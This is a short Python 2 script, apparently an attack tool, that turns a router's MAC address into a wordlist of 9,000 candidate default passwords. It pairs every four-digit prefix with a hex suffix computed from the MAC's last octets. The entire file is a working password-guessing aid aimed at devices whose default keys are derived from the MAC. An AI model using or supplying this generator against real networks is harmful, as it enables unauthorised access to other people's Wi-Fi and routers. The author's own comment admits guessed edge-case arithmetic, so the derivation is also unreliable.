import sys
import re


def verify_mac(value):
    return re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", value)


def is_number_even(number):
    return number%2 == 0


def convert_string_to_hex_integer(string):
    return int(string, 16)


def convert_int_to_hex_string(number):
    return hex(number).lower().replace("0x","")


if len(sys.argv) < 2:
    print "Usage: python " + sys.argv[0] + " mac [outputFilename]"
    print "If no outputFilename is specifier results will be printed on stdout"
    exit()

outputFile = False
if len(sys.argv) >2:
    outputFile = sys.argv[2]

mac = sys.argv[1]

#verify mac
if not verify_mac(sys.argv[1]):
    print "Mac must be in the format ab:ab:ab:ab:ab:ab"
    exit()

#get latest digits
latestDigitsString = mac[12:17].replace(":","")

#convert them to int
latestDigitsInteger = convert_string_to_hex_integer(latestDigitsString)

#find out password latestDigits
#don't have data for the edges. Guessing %0xffff
if is_number_even(latestDigitsInteger):
    passwordEndInt = (latestDigitsInteger - 8)%0xffff
else:
    passwordEndInt = (latestDigitsInteger - 1)%0xffff

passwordEndString = convert_int_to_hex_string(passwordEndInt)

f = False
if outputFile:
    f = open(outputFile, "w")

for i in range(1000,10000):
    finalValue = repr(i)+passwordEndString
    if f:
        f.write(finalValue+"\n")
    else:
        print finalValue

